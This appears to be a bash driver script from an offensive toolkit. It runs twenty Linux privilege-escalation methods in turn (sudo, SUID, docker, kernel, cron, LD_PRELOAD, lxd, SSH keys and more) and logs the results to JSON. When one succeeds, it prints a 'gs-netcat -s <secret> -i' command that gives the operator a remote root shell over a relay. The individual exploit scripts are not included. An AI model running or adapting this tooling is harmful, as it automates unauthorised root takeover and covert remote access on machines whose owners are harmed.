#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
source "$DIR/00_common.sh"

mkdir -p "$WORKDIR"
RESULT="$WORKDIR/lpe.json"

echo '{"status":"running","methods":[' > "$RESULT"

METHODS=(01_sudo 02_suid 03_passwd 04_docker 05_capabilities 06_kernel 07_cron 08_ldpreload 09_redis 10_passwords 11_nfs 12_path 13_dbus 14_lxd 15_systemd 16_sshkeys 17_mysql 18_tmux 19_pspy 20_final)

ROOT_SECRET=""
ROOT_METHOD=""
first=1

for m in "${METHODS[@]}"; do
    script="$DIR/${m}.sh"
    [ ! -f "$script" ] && continue
    
    info "Running $m..."
    out=$(timeout 15 bash "$script" 2>/dev/null)
    
    [ $first -eq 0 ] && echo "," >> "$RESULT"
    first=0
    echo "$out" >> "$RESULT"
    
    if echo "$out" | grep -q '"status":"success"'; then
        secret=$(echo "$out" | sed -n 's/.*"secret":"\([^"]*\)".*/\1/p')
        if [ -n "$secret" ]; then
            ROOT_SECRET="$secret"
            ROOT_METHOD="$m"
            success "ROOT via $m!"
            break
        fi
    fi
done

echo '],' >> "$RESULT"

if [ -n "$ROOT_SECRET" ]; then
    echo '"root_achieved":true,' >> "$RESULT"
    echo "\"root_secret\":\"$ROOT_SECRET\"," >> "$RESULT"
    echo "\"root_method\":\"$ROOT_METHOD\"" >> "$RESULT"
    success "ROOT ACCESS: gs-netcat -s $ROOT_SECRET -i"
else
    echo '"root_achieved":false,' >> "$RESULT"
    echo '"root_secret":"",' >> "$RESULT"
    echo '"root_method":""' >> "$RESULT"
    warn "Root not achieved"
fi

echo '}' >> "$RESULT"
cat "$RESULT"
